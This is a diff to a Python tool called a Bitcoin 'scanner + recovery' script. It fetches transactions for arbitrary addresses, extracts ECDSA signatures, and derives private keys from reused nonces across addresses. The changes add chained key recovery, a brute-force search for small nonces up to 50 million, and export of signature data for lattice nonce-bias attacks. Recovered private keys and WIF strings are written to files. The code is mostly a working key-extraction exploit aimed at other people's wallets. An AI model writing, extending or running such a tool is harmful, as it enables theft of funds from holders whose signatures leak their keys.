@@ -1,6 +1,6 @@
 # ==============================================================================
 # MERGED VPK BITCOIN SCANNER + RECOVERY TOOL (v3.0 - FINAL FIX)
-# FEATURES: 
+# FEATURES:
 # 1. FIXED: Public Key Extraction (More Accurate Regex)
 # 2. FIXED: OpenSSL 3.0 / RIPEMD160 Crash
 # 3. FIXED: Auto-Recovery & File Input
@@ -10,6 +10,8 @@ import requests, time, os, sys, math, signal
 import re
 import hashlib
 import csv
+import argparse
+import json
 from collections import defaultdict
 from datetime import datetime
 from typing import List, Dict, Any, Optional, Tuple
@@ -52,6 +54,7 @@ N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 BATCH_SIZE = 25
 REQ_TIMEOUT = 20
 MAX_RETRIES = 10
+BRUTE_FORCE_LIMIT = 50000000
 
 TOTAL_ADDRESSES = 0
 SCANNED_ADDRESSES = 0
@@ -188,7 +191,7 @@ def fetch_all_transactions(address: str, max_retries: int = 3) -> List[dict]:
 
         print(f"\nAddress {address} has {total} total transactions")
         total_to_fetch = min(total, MAX_TRANSACTIONS) if MAX_TRANSACTIONS > 0 else total
-        
+
         out: List[dict] = []
         offset = 0
         while offset < total_to_fetch and not EXIT_FLAG:
@@ -326,13 +329,13 @@ def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optiona
         elif len(spk_bytes) == 23 and spk_bytes[:2] == b'\xa9\x14':
              scriptsig = txin.get("scriptsig", "")
              if isinstance(scriptsig, dict): scriptsig = scriptsig.get("hex", "")
-             
+
              if len(scriptsig) == 46:
                  redeem_hex = scriptsig[2:]
                  redeem_bytes = bytes.fromhex(redeem_hex)
                  if len(redeem_bytes) == 22 and redeem_bytes[:2] == b'\x00\x14':
                      hash160 = redeem_bytes[2:]
-             
+
         if not hash160:
              witness = txin.get("witness", [])
              if len(witness) == 2:
@@ -368,7 +371,7 @@ def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int
         txin = vins[vin_idx]
         prevout = txin.get("prevout", {})
         input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))
-        
+
         if input_type in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
             return compute_bip143_sighash(tx, vin_idx, sighash_flag)
         else:
@@ -405,40 +408,40 @@ def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
     """
     if not script_hex: return None
     hexstr = script_hex.lower()
-    
+
     # 1. Uncompressed Keys (04 + 64 bytes X + 64 bytes Y = 130 hex chars)
     # Checks specifically for '04' followed by 128 hex digits
     uncompressed = re.findall(r'04[0-9a-f]{128}', hexstr)
-    
+
     # 2. Compressed Keys (02 or 03 + 32 bytes X = 66 hex chars)
     # Checks specifically for '02' or '03' followed by 64 hex digits
     compressed = re.findall(r'(?:02|03)[0-9a-f]{64}', hexstr)
-    
+
     # Priority: In legacy P2PKH, the pubkey is usually the LAST pushdata.
     # We combine candidates and pick the one that appears LAST in the string
     # because the structure is usually: [Signature] [PublicKey]
-    
+
     candidates = []
-    
+
     for pk in uncompressed:
         candidates.append(pk)
-        
+
     for pk in compressed:
         candidates.append(pk)
-        
+
     if not candidates:
         return None
-        
+
     # If multiple candidates, we find which one is physically last in the hex string
     best_candidate = None
     last_index = -1
-    
+
     for cand in candidates:
         idx = hexstr.rfind(cand)
         if idx > last_index:
             last_index = idx
             best_candidate = cand
-            
+
     return best_candidate
 
 def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
@@ -452,7 +455,7 @@ def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
                 pubkey = None
                 sighash_flag = 1
                 witness = txin.get("witness", [])
-                
+
                 # STRATEGY 1: Check Witness (SegWit) - Most Reliable for newer txs
                 if witness and len(witness) >= 2:
                     sig_hex = witness[0]
@@ -461,24 +464,24 @@ def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
                     if len(possible_pub) == 66 or len(possible_pub) == 130:
                         pubkey = possible_pub
                     parsed = parse_der_sig_from_hex(sig_hex)
-                
+
                 # STRATEGY 2: Check ScriptSig (Legacy) if no witness success
                 if not pubkey or not parsed:
                     scriptsig = txin.get("scriptsig", {})
                     # Ensure we get the HEX string, not ASM
                     script_hex = scriptsig.get("hex", "") if isinstance(scriptsig, dict) else txin.get("scriptsig", "")
-                    
+
                     if script_hex:
                         if not pubkey:
                             pubkey = extract_pubkey_from_scriptsig(script_hex)
                         if not parsed:
                             parsed = parse_der_sig_from_hex(script_hex)
-                        
+
                 if not parsed or not pubkey: continue
-                
+
                 r, s, sighash_flag = parsed
                 z_val = compute_sighash_z(tx, vin_idx, sighash_flag)
-                
+
                 if z_val is not None:
                     sigs.append({
                         "txid": txid, "vin": vin_idx, "r": r, "s": s,
@@ -515,14 +518,14 @@ def check_reused_nonce_global(this_address: str, signatures: List[Dict[str, Any]
 
 def save_rnonce(vulns: List[Dict[str, Any]], address: str):
     if not vulns: return
-    
+
     os.makedirs(OUTPUT_DIR, exist_ok=True)
-    
+
     # Append to human readable file
     for v in vulns:
         if v["type"] != "Reused Nonce": continue
         r_hex = v["r"][2:] if isinstance(v.get("r"), str) and v["r"].startswith("0x") else str(hex(int(v.get("r")))[2:])
-        
+
         # Track globally
         for occ in v["occurrences"]:
             txid = occ.get("txid") or "N/A"
@@ -572,6 +575,74 @@ def save_rnonce(vulns: List[Dict[str, Any]], address: str):
             f.write("\n")
     print(f"[updated] {OUTPUT_R_NON}")
 
+def analyze_for_lll(address: str, signatures: List[Dict[str, Any]]):
+    """
+    Analyzes signatures for LLL attack suitability (nonce bias).
+    """
+    if len(signatures) < 10:
+        return
+
+    # Statistical analysis (Simple MSB check / bit length)
+    s_lengths = []
+    r_lengths = []
+
+    export_data = {
+        "address": address,
+        "n": hex(N),
+        "signatures": []
+    }
+
+    for sig in signatures:
+        r = sig['r']
+        s = sig['s']
+        z = sig['z_original']
+        pub = sig['pubkey']
+
+        s_lengths.append(s.bit_length())
+        r_lengths.append(r.bit_length())
+
+        export_data["signatures"].append({
+            "r": hex(r),
+            "s": hex(s),
+            "z": hex(z),
+            "pubkey": pub
+        })
+
+    avg_s_bits = sum(s_lengths) / len(s_lengths)
+    avg_r_bits = sum(r_lengths) / len(r_lengths)
+
+    # Heuristic: If average s or r length is significantly < 256, it's interesting.
+    # Also if we have MANY signatures (e.g. > 50), even small bias is exploitable.
+
+    is_interesting = False
+    reason = []
+
+    if len(signatures) >= 50:
+        is_interesting = True
+        reason.append(f"High signature count ({len(signatures)})")
+
+    if avg_s_bits < 250 or avg_r_bits < 250: # Arbitrary threshold for "obvious" bias
+        is_interesting = True
+        reason.append(f"Low average bit length (s={avg_s_bits:.1f}, r={avg_r_bits:.1f})")
+
+    if is_interesting:
+        # Save JSON
+        filename = os.path.join(OUTPUT_DIR, f"{address}_lll_data.json")
+        try:
+            with open(filename, "w") as f:
+                json.dump(export_data, f, indent=2)
+            print(f"[LLL] Saved candidate data to {filename}")
+
+            # Append to summary
+            summary_file = os.path.join(OUTPUT_DIR, "LLL_CANDIDATES.txt")
+            with open(summary_file, "a") as f:
+                f.write(f"Address: {address}\n")
+                f.write(f"Reason: {', '.join(reason)}\n")
+                f.write(f"Signatures: {len(signatures)}\n")
+                f.write("-" * 40 + "\n")
+        except Exception as e:
+            print(f"[err] LLL export failed: {e}")
+
 def analyze_address(address: str) -> Optional[Dict[str, Any]]:
     global SCANNED_ADDRESSES, VULNERABLE_ADDRESSES, CURRENT_ADDRESS
     CURRENT_ADDRESS = address
@@ -586,6 +657,9 @@ def analyze_address(address: str) -> Optional[Dict[str, Any]]:
     sigs = extract_signatures(txs)
     report["signature_count"] = len(sigs)
     print(f"Extracted {len(sigs)} signatures from {len(txs)} txs")
+
+    analyze_for_lll(address, sigs)
+
     for g in sigs:
         GLOBAL_R_MAP[g["r"]].append({
             "address": address, "txid": g.get("txid", ""), "pubkey": g.get("pubkey"),
@@ -687,23 +761,23 @@ def priv_to_wif(priv_hex, compressed=True):
 def pub_to_addresses(pub_hex):
     pub_bytes = bytes.fromhex(pub_hex)
     sha = hashlib.sha256(pub_bytes).digest()
-    
+
     # FIXED: Use custom calc_ripemd160
     ripe = calc_ripemd160(sha)
-    
+
     # 1. P2PKH (Legacy)
     p2pkh = base58_encode(b"\x00" + ripe + hashlib.sha256(hashlib.sha256(b"\x00" + ripe).digest()).digest()[:4])
-    
+
     # 2. P2WPKH (Native SegWit - Bech32)
     witness_prog = convertbits(ripe, 8, 5)
     p2wpkh = bech32_encode("bc", [0] + witness_prog)
-    
+
     # 3. P2SH-P2WPKH (Nested SegWit)
     redeem = b"\x00\x14" + ripe
     sha_r = hashlib.sha256(redeem).digest()
     ripe_r = calc_ripemd160(sha_r) # FIXED
     p2sh = base58_encode(b"\x05" + ripe_r + hashlib.sha256(hashlib.sha256(b"\x05" + ripe_r).digest()).digest()[:4])
-    
+
     return p2pkh, p2wpkh, p2sh
 
 def modinv(a, m=N):
@@ -715,7 +789,7 @@ def verify_key(pub_hex, priv_int):
         sk = ecdsa.SigningKey.from_secret_exponent(priv_int, curve=curve)
         vk = sk.verifying_key
         pt = vk.pubkey.point
-        
+
         if pub_hex.startswith('04') and len(pub_hex) == 130:
             x_bytes = pt.x().to_bytes(32, 'big')
             y_bytes = pt.y().to_bytes(32, 'big')
@@ -724,7 +798,7 @@ def verify_key(pub_hex, priv_int):
             x_bytes = pt.x().to_bytes(32, 'big')
             prefix = b'\x02' if pt.y() % 2 == 0 else b'\x03'
             generated_pub = (prefix + x_bytes).hex()
-            
+
         return generated_pub == pub_hex.lower()
     except:
         return False
@@ -733,7 +807,7 @@ def attempt_bootstrap(r, s1, z1, s2, z2):
     candidates = []
     s1_opts = [s1, N - s1]
     s2_opts = [s2, N - s2]
-    
+
     for _s1 in s1_opts:
         for _s2 in s2_opts:
             if _s1 == _s2: continue
@@ -748,7 +822,7 @@ def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
     candidates = []
     s_known_opts = [s_known, N - s_known]
     s_target_opts = [s_target, N - s_target]
-    
+
     for _sk in s_known_opts:
         try:
             k = ((z_known + r * d_known) * modinv(_sk, N)) % N
@@ -778,12 +852,12 @@ def start_recovery():
         r_match = re.search(r"r:\s*([a-f0-9]{1,64})", block, re.IGNORECASE)
         if not r_match: continue
         r_hex = r_match.group(1).lower()
-        
+
         txs = re.findall(r"s=([a-f0-9]+)[\s\S]*?z=([a-f0-9]+)[\s\S]*?pubkey=([a-f0-9]+)", block, re.IGNORECASE)
-        
+
         valid_txs = []
         for s, z, pub in txs:
-            if z != "N/A" and pub != "N/A": 
+            if z != "N/A" and pub != "N/A":
                 valid_txs.append((s, z, pub))
 
         if len(valid_txs) >= 2:
@@ -797,57 +871,119 @@ def start_recovery():
 
     print("\n[+] STARTING RECOVERY ENGINE...")
 
-    while found_something:
-        iteration += 1
-        found_something = False
-        print(f"--- Iteration {iteration} (Keys Found: {len(recovered_db)}) ---")
-        
-        for group in parsed_groups:
-            r = group['r']
-            txs = group['txs']
-            
-            pub_map = {}
-            for s, z, pub in txs:
-                pub = pub.lower()
-                if pub not in pub_map: pub_map[pub] = []
-                pub_map[pub].append((int(s, 16), int(z, 16)))
-                
-            # Bootstrap
-            for pub, entries in pub_map.items():
-                if pub in recovered_db: continue
-                if len(entries) >= 2:
-                    s1, z1 = entries[0]
-                    s2, z2 = entries[1]
-                    candidates = attempt_bootstrap(r, s1, z1, s2, z2)
-                    for d in candidates:
-                        if verify_key(pub, d):
-                            recovered_db[pub] = d
-                            print(f"   [BOOTSTRAP SUCCESS] Key found: {pub[:16]}...")
-                            found_something = True
-                            break
-            
-            # Chain
-            master_params = None
-            for s, z, pub in txs:
-                pub = pub.lower()
+    attack_active = True
+    while attack_active:
+        found_something = True
+        while found_something:
+            iteration += 1
+            found_something = False
+            print(f"--- Iteration {iteration} (Keys Found: {len(recovered_db)}) ---")
+
+            for group in parsed_groups:
+                r = group['r']
+                txs = group['txs']
+
+                pub_map = {}
+                for s, z, pub in txs:
+                    pub = pub.lower()
+                    if pub not in pub_map: pub_map[pub] = []
+                    pub_map[pub].append((int(s, 16), int(z, 16)))
+
+                # Bootstrap
+                for pub, entries in pub_map.items():
+                    if pub in recovered_db: continue
+                    if len(entries) >= 2:
+                        s1, z1 = entries[0]
+                        s2, z2 = entries[1]
+                        candidates = attempt_bootstrap(r, s1, z1, s2, z2)
+                        for d in candidates:
+                            if verify_key(pub, d):
+                                recovered_db[pub] = d
+                                print(f"   [BOOTSTRAP SUCCESS] Key found: {pub[:16]}...")
+                                found_something = True
+                                break
+
+                # Chain
+                master_params = None
+                for s, z, pub in txs:
+                    pub = pub.lower()
+                    if pub in recovered_db:
+                        master_params = (int(s, 16), int(z, 16), recovered_db[pub])
+                        break
+
+                if master_params:
+                    s_known, z_known, d_known = master_params
+                    for s_target_hex, z_target_hex, pub_target in txs:
+                        pub_target = pub_target.lower()
+                        if pub_target in recovered_db: continue
+                        s_t = int(s_target_hex, 16)
+                        z_t = int(z_target_hex, 16)
+                        candidates = attempt_chain(r, s_known, z_known, d_known, s_t, z_t)
+                        for d in candidates:
+                            if verify_key(pub_target, d):
+                                recovered_db[pub_target] = d
+                                print(f"   [CHAINED] Unlocked: {pub_target[:16]}...")
+                                found_something = True
+                                break
+
+        # Phase 2: Brute Force Islands
+        unsolved_groups = []
+        for i, group in enumerate(parsed_groups):
+            solved = False
+            for s, z, pub in group['txs']:
                 if pub in recovered_db:
-                    master_params = (int(s, 16), int(z, 16), recovered_db[pub])
+                    solved = True
                     break
-            
-            if master_params:
-                s_known, z_known, d_known = master_params
-                for s_target_hex, z_target_hex, pub_target in txs:
-                    pub_target = pub_target.lower()
-                    if pub_target in recovered_db: continue
-                    s_t = int(s_target_hex, 16)
-                    z_t = int(z_target_hex, 16)
-                    candidates = attempt_chain(r, s_known, z_known, d_known, s_t, z_t)
-                    for d in candidates:
-                        if verify_key(pub_target, d):
-                            recovered_db[pub_target] = d
-                            print(f"   [CHAINED] Unlocked: {pub_target[:16]}...")
-                            found_something = True
-                            break
+            if not solved:
+                unsolved_groups.append(i)
+
+        if not unsolved_groups:
+            print("[+] All groups solved.")
+            break
+
+        print(f"\n[?] Attack Stalled. {len(unsolved_groups)} groups remain locked.")
+        print(f"[!] Phase 2: Scanning for weak nonces (Limit: {BRUTE_FORCE_LIMIT})...")
+
+        # Map r (int) -> group_index
+        r_map = {parsed_groups[i]['r']: i for i in unsolved_groups}
+
+        start = time.time()
+        pt = curve.generator
+        found_ks = {}
+
+        # Fast point addition
+        for k in range(1, BRUTE_FORCE_LIMIT + 1):
+            if k % 1000000 == 0:
+                print(f"    Scanning k={k}...")
+
+            rx = pt.x()
+            if rx in r_map:
+                g_idx = r_map[rx]
+                print(f"    [CRACKED] Weak nonce found k={k} for Group {g_idx}")
+                found_ks[g_idx] = k
+                del r_map[rx]
+                if not r_map: break
+
+            pt = pt + curve.generator
+
+        print(f"[-] Scan finished in {time.time()-start:.2f}s.")
+
+        if found_ks:
+            print(f"[+] Found {len(found_ks)} new entry points! Injecting and restarting Phase 1...")
+            # Inject keys
+            for g_idx, k_val in found_ks.items():
+                group = parsed_groups[g_idx]
+                r = group['r']
+                for s_hex, z_hex, pub in group['txs']:
+                    if pub not in recovered_db:
+                        s_val = int(s_hex, 16)
+                        z_val = int(z_hex, 16)
+                        priv = ((s_val * k_val - z_val) * modinv(r, N)) % N
+                        recovered_db[pub] = priv
+                        print(f"   [INJECT] Key Recovered: {pub[:16]}...")
+        else:
+            print("[-] No weak nonces found. Exiting.")
+            attack_active = False
 
     print(f"\n[+] SCAN FINISHED. Total Private Keys: {len(recovered_db)}")
 
@@ -858,19 +994,19 @@ def start_recovery():
             wif_list = []
             for pub, priv_int in recovered_db.items():
                 priv_hex = hex(priv_int)[2:].zfill(64)
-                
+
                 if pub.startswith('04') and len(pub) == 130:
                     is_compressed = False
                     key_type = "Uncompressed"
                 else:
                     is_compressed = True
                     key_type = "Compressed"
-                
+
                 wif = priv_to_wif(priv_hex, compressed=is_compressed)
                 a1, a2, a3 = pub_to_addresses(pub)
                 w.writerow([pub, priv_hex, wif, key_type, a1, a2, a3])
                 wif_list.append(wif)
-                
+
         with open(OUTPUT_WIF, "w") as f:
             f.write("\n".join(wif_list))
         print(f"Data saved to {OUTPUT_CSV} and {OUTPUT_WIF}")
@@ -879,10 +1015,23 @@ def start_recovery():
 
 def main():
     global TOTAL_ADDRESSES, MAX_TRANSACTIONS
+
+    parser = argparse.ArgumentParser(description="VPK Bitcoin Scanner & Recovery Tool")
+    parser.add_argument("-f", "--file", help="Path to file containing Bitcoin addresses (one per line)")
+    parser.add_argument("-l", "--limit", type=int, default=0, help="Max transactions to scan per address (0=unlimited)")
+    args = parser.parse_args()
+
+    # Create output dir
+    os.makedirs(OUTPUT_DIR, exist_ok=True)
+
     try:
-        addr_file = get_input_file()
-        MAX_TRANSACTIONS = get_transaction_limit()
-        
+        if args.file:
+            addr_file = args.file
+            MAX_TRANSACTIONS = args.limit
+        else:
+            addr_file = get_input_file()
+            MAX_TRANSACTIONS = get_transaction_limit()
+
         with open(addr_file, "r", encoding="utf-8") as f:
             addresses = [ln.strip() for ln in f if ln.strip()]
         TOTAL_ADDRESSES = len(addresses)
@@ -901,12 +1050,12 @@ def main():
             print("SCAN INTERRUPTED BY USER. PROCESSING COLLECTED DATA...")
         else:
             print("SCAN COMPLETED. PROCESSING DATA...")
-        
+
         # AUTOMATICALLY TRIGGER RECOVERY
         print("\n" + "="*80)
         print("STARTING RECOVERY MODULE (On collected data)")
         print("="*80 + "\n")
-        
+
         start_recovery()
 
     except KeyboardInterrupt:
